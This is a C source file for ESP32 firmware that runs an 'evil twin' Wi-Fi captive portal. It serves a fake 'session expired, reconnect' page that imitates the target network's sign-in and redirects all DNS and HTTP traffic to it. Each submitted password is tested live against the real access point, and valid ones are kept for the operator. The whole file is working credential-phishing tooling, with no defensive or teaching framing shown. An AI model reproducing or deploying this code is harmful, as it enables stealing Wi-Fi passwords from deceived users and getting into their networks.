/**
 * @file webserver.c
 * @brief Implements the captive portal: HTTP server + live credential
 * verification against the real target AP.
 */
#include "webserver.h"

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_http_server.h"
#include "freertos/FreeRTOS.h"
#include "freertos/event_groups.h"

#include "wifi_controller.h"
#include "dns_server.h"

static const char *TAG = "webserver";

#define VERIFY_CONNECTED_BIT BIT0
#define VERIFY_FAILED_BIT BIT1
#define VERIFY_TIMEOUT_MS 10000

static httpd_handle_t server = NULL;
static wifi_ap_record_t target_ap_record;
static EventGroupHandle_t verify_event_group = NULL;
static bool verifying = false;
static char captured_password[65];
static bool have_captured_password = false;

static const char *LOGIN_PAGE_FMT =
    "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
    "<title>Wi-Fi Sign-in</title>"
    "<style>body{font-family:sans-serif;max-width:400px;margin:60px auto;padding:0 20px;color:#222}"
    "h2{font-weight:600}input{width:100%%;padding:10px;margin:8px 0;box-sizing:border-box;"
    "border:1px solid #ccc;border-radius:4px}button{width:100%%;padding:10px;background:#1a73e8;"
    "color:#fff;border:0;border-radius:4px;font-size:15px}.err{color:#c5221f;font-size:14px}</style>"
    "</head><body><h2>Reconnect to \"%s\"</h2>"
    "<p>Your session expired. Enter the Wi-Fi password to reconnect.</p>"
    "%s"
    "<form method=\"POST\" action=\"/login\">"
    "<input type=\"password\" name=\"password\" placeholder=\"Wi-Fi password\" required autofocus>"
    "<button type=\"submit\">Connect</button>"
    "</form></body></html>";

static const char *SUCCESS_PAGE =
    "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
    "<title>Connected</title></head><body style=\"font-family:sans-serif;max-width:400px;margin:60px auto;"
    "padding:0 20px\"><h2>Connected</h2><p>You're all set.</p></body></html>";

static void verify_event_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    if (!verifying || verify_event_group == NULL) {
        return;
    }
    if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        xEventGroupSetBits(verify_event_group, VERIFY_CONNECTED_BIT);
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        xEventGroupSetBits(verify_event_group, VERIFY_FAILED_BIT);
    }
}

/**
 * @brief Minimal application/x-www-form-urlencoded decoder, in place.
 */
static void url_decode(char *s) {
    char *out = s;
    while (*s) {
        if (*s == '+') {
            *out++ = ' ';
            s++;
        } else if (*s == '%' && s[1] && s[2]) {
            char hex[3] = {s[1], s[2], 0};
            *out++ = (char) strtol(hex, NULL, 16);
            s += 3;
        } else {
            *out++ = *s++;
        }
    }
    *out = '\0';
}

/**
 * @brief Attempts to connect the STA interface to the real target AP with
 * the given password and blocks (with a timeout) for the result.
 *
 * @return true if the password was correct (STA got an IP)
 */
static bool verify_password(const char *password) {
    verifying = true;
    xEventGroupClearBits(verify_event_group, VERIFY_CONNECTED_BIT | VERIFY_FAILED_BIT);

    wifictl_sta_connect_to_ap(&target_ap_record, password);

    EventBits_t bits = xEventGroupWaitBits(verify_event_group, VERIFY_CONNECTED_BIT | VERIFY_FAILED_BIT,
                                            pdTRUE, pdFALSE, pdMS_TO_TICKS(VERIFY_TIMEOUT_MS));
    verifying = false;

    bool ok = (bits & VERIFY_CONNECTED_BIT) != 0;
    wifictl_sta_disconnect();
    return ok;
}

static esp_err_t login_page_handler(httpd_req_t *req) {
    char buf[1024];
    snprintf(buf, sizeof(buf), LOGIN_PAGE_FMT, target_ap_record.ssid, "");
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, buf, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t login_post_handler(httpd_req_t *req) {
    if (verifying) {
        httpd_resp_set_status(req, "503 Service Unavailable");
        httpd_resp_send(req, "Busy, try again in a moment.", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }

    char body[256];
    int len = req->content_len < (int) sizeof(body) - 1 ? req->content_len : (int) sizeof(body) - 1;
    int received = httpd_req_recv(req, body, len);
    if (received <= 0) {
        return ESP_FAIL;
    }
    body[received] = '\0';

    char password[65] = {0};
    char *field = strstr(body, "password=");
    if (field != NULL) {
        field += strlen("password=");
        char *end = strchr(field, '&');
        size_t field_len = end != NULL ? (size_t)(end - field) : strlen(field);
        if (field_len >= sizeof(password)) {
            field_len = sizeof(password) - 1;
        }
        memcpy(password, field, field_len);
        password[field_len] = '\0';
        url_decode(password);
    }

    ESP_LOGI(TAG, "Verifying submitted password against '%s'...", target_ap_record.ssid);
    bool ok = verify_password(password);

    if (ok) {
        strncpy(captured_password, password, sizeof(captured_password) - 1);
        have_captured_password = true;
        ESP_LOGI(TAG, "Captured valid password for '%s'", target_ap_record.ssid);
        httpd_resp_set_type(req, "text/html");
        httpd_resp_send(req, SUCCESS_PAGE, HTTPD_RESP_USE_STRLEN);
    } else {
        char buf[1024];
        snprintf(buf, sizeof(buf), LOGIN_PAGE_FMT, target_ap_record.ssid,
                 "<p class=\"err\">Incorrect password, try again.</p>");
        httpd_resp_set_type(req, "text/html");
        httpd_resp_send(req, buf, HTTPD_RESP_USE_STRLEN);
    }
    return ESP_OK;
}

void webserver_start(const wifi_ap_record_t *target_ap_record_arg) {
    if (server != NULL) {
        ESP_LOGW(TAG, "Webserver already running, stop it first");
        return;
    }
    memcpy(&target_ap_record, target_ap_record_arg, sizeof(target_ap_record));
    have_captured_password = false;

    if (verify_event_group == NULL) {
        verify_event_group = xEventGroupCreate();
    }
    ESP_ERROR_CHECK(esp_event_handler_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &verify_event_handler, NULL));
    ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_STA_DISCONNECTED, &verify_event_handler, NULL));

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.uri_match_fn = httpd_uri_match_wildcard;
    config.max_uri_handlers = 4;
    ESP_ERROR_CHECK(httpd_start(&server, &config));

    const httpd_uri_t login_post = {
        .uri = "/login",
        .method = HTTP_POST,
        .handler = login_post_handler,
    };
    httpd_register_uri_handler(server, &login_post);

    const httpd_uri_t catch_all = {
        .uri = "/*",
        .method = HTTP_GET,
        .handler = login_page_handler,
    };
    httpd_register_uri_handler(server, &catch_all);

    dns_server_start();
    ESP_LOGI(TAG, "Captive portal started for '%s'", target_ap_record.ssid);
}

void webserver_stop() {
    if (server == NULL) {
        return;
    }
    dns_server_stop();
    httpd_stop(server);
    server = NULL;
    ESP_ERROR_CHECK(esp_event_handler_unregister(IP_EVENT, IP_EVENT_STA_GOT_IP, &verify_event_handler));
    ESP_ERROR_CHECK(esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_STA_DISCONNECTED, &verify_event_handler));
    ESP_LOGI(TAG, "Captive portal stopped");
}

const char *webserver_get_captured_password() {
    return have_captured_password ? captured_password : NULL;
}
